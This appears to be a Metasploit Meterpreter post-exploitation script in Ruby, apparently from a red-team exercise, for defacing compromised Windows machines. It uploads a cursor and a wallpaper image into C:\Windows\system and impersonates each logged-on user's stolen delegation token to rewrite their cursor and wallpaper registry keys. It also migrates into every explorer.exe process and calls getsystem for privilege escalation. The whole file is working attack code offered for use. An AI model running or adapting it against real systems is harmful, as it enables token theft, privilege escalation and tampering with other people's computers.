@client = client
client.core.use "incognito"
key = "HKEY_CURRENT_USER"
ip = "192.168.56.128"
key_path = "#{key}\\Control\ Panel\\Cursors"

upload_cur_dir = "C:\\Windows\\system"
cur_file = "path/to/cur/file"
cur_upload_name = "cursor.cur"

upload_back_dir = "C:\\Windows\\system"
back_file = "/root/red/files/LastingBackground.jpg"
back_upload_name = "background.jpg"

def write_script_to_target(target_dir, filename, uploadname)
  if target_dir
    tempdir = target_dir
  end
  fileup = File.open("#{filename}", "r")
  data = fileup.read
  fileup.close
  tempvbs = tempdir + "\\" + "#{uploadname}"
  fd = @client.fs.file.new(tempvbs, "wb")
  fd.write(data)
  fd.close
  if(@client.fs.file.exists?("#{tempvbs}"))
	  print_good("Daves Face written to #{tempvbs} as #{@client.sys.config.getuid}")
  else
	  print_bad("Daves Face not written to #{tempvbs}")
  end
  # Escape windows pathname separators.
  return tempvbs
end

	#client.fs.file.exists?("file")
	#client.fs.upload
	#/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi
	write_script_to_target(upload_cur_dir, cur_file, cur_upload_name)
	write_script_to_target(upload_back_dir, back_file, back_upload_name)
	#/usr/share/metasploit-framework/lib/msf/core/post/windows/registry.rb
	test = registry_enumvals("#{key}")

	tokens=client.incognito.incognito_list_tokens(0)
	usertokens=tokens["delegation"]
	usertokens.split("\n").each do |changetoken|
		if(changetoken.split("\\")[0]=="NT AUTHORITY")
			print("YOU WILL RESPECT MY AUTHORITY\n")
		else
			print(client.sys.config.getuid + "\n")
			client.incognito.incognito_impersonate_token(changetoken)
			print_good(client.sys.config.getuid)

			#Mouse
			key_path = "#{key}\\Control\ Panel\\Cursors"
			registry_setvaldata("#{key_path}", "Arrow", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
			registry_setvaldata("#{key_path}", "Hand", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
			registry_setvaldata("#{key_path}", "Help", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
			registry_setvaldata("#{key_path}", "Wait", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
			registry_setvaldata("#{key_path}", "AppStarting", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")

			#Background
			key_path = "#{key}\\Control\ Panel\\Desktop"
			registry_setvaldata("#{key_path}", "Wallpaper", "#{upload_back_dir}\\#{back_upload_name}", "REG_SZ")
			registry_setvaldata("#{key_path}", "TileWallpaper", "0", "REG_SZ")
			registry_setvaldata("#{key_path}", "WallpaperStyle", "2", "REG_SZ")

			client.sys.config.revert_to_self
			print_good(client.sys.config.getuid)
		end
	end

	pid = 1000
	pids = Array.new()
	processes = client.sys.process.get_processes
	processes.each do |proc|
		pids << proc['pid'] if proc['name'] == "explorer.exe"
		pid = proc['pid'] if proc['name'] == "lsass.exe"
	end
	pids.each do |procd|
		session.core.migrate(procd)
	                #Mouse
	#                key_path = "#{key}\\Control\ Panel\\Cursors"
	#                registry_setvaldata("#{key_path}", "Arrow", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "Hand", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "Help", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "Wait", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "AppStarting", "#{upload_cur_dir}\\#{cur_upload_name}", "REG_SZ")
	
	                #Background
	#                key_path = "#{key}\\Control\ Panel\\Desktop"
	#                registry_setvaldata("#{key_path}", "Wallpaper", "#{upload_back_dir}\\#{back_upload_name}", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "TileWallpaper", "0", "REG_SZ")
	#                registry_setvaldata("#{key_path}", "WallpaperStyle", "2", "REG_SZ")
	
		client.railgun.user32.SystemParametersInfoA(0x57, 0, nil, 0)
		client.railgun.user32.SystemParametersInfoA(0x14, 0, nil, 0)
		print_good("Migrated and ran")
		@client.priv.getsystem(-1)
	end
	#session.core.migrate(pid)
	#print_good("MIGRATED back")

	client.railgun.user32.SystemParametersInfoA(0x57, 0, nil, 0)
	client.railgun.user32.SystemParametersInfoA(0x14, 0, nil, 0)

